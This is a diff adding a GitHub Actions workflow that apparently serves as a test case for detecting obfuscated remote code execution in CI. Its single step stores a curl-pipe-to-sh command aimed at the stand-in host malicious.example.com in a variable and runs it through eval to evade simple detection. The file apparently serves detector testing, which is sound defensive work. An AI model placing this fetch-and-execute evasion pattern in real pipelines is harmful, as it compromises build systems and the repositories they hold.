@@ -1,0 +1,16 @@
+name: Evasion Multiline Shell Obfuscation
+on: [push]
+permissions:
+  contents: read
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@b4ffde65f46336ab88eb53be808477a3936bae11
+        with:
+          persist-credentials: false
+      - name: Split download and execution across separate subshells
+        run: |
+          PAYLOAD_URL="https://malicious.example.com/r.sh"
+          CMD_STR="curl -sSL $PAYLOAD_URL | sh"
+          eval "$CMD_STR"
